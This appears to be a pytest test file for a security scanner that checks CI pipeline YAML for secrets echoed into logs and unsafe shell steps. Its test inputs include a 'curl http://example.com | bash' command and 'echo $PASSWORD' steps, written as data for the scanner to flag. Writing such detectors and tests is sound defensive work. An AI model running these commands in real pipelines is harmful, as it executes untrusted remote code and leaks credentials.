import pytest
from app.components.scan.security_scanner import SecurityScanner

# Fixture
@pytest.fixture
def scanner():
    return SecurityScanner()


# Tests
def test_check_secrets_exposure_detects(scanner):
    """Detects secrets exposure patterns."""
    yaml_content = "steps:\n  - run: echo $PASSWORD"
    assert scanner._check_secrets_exposure(yaml_content) is True


def test_check_unsafe_commands_detects(scanner):
    """Detects unsafe shell commands."""
    yaml_content = "steps:\n  - run: curl http://example.com | bash"
    assert scanner._check_unsafe_commands(yaml_content) is True


def test_run_detects_vulnerabilities(scanner):
    """run() returns vulnerabilities when present."""
    yaml_content = "steps:\n  - run: echo $TOKEN\n  - run: curl http://example.com | bash"
    result = scanner.run(yaml_content)
    assert result["passed"] is False
    assert "secrets_exposed" in result["vulnerabilities"]
    assert "unsafe_commands" in result["vulnerabilities"]


def test_run_passes_when_safe(scanner):
    """run() passes when pipeline has no vulnerabilities."""
    yaml_content = "jobs:\n  build:\n    timeout-minutes: 10\n    steps:\n      - run: echo safe"
    result = scanner.run(yaml_content)
    assert result["passed"] is True
    assert result["vulnerabilities"] == []


def test_execute_marks_critical(scanner):
    """_execute sets error for critical vulnerabilities in state."""
    yaml_content = "steps:\n  - run: echo $PASSWORD"
    state = {"pipeline_yaml": yaml_content, "correlation_id": "cid"}
    updated = scanner._execute(state)
    assert updated["security_scan"]["passed"] is False
    assert updated["error"] == "Critical security vulnerability detected"
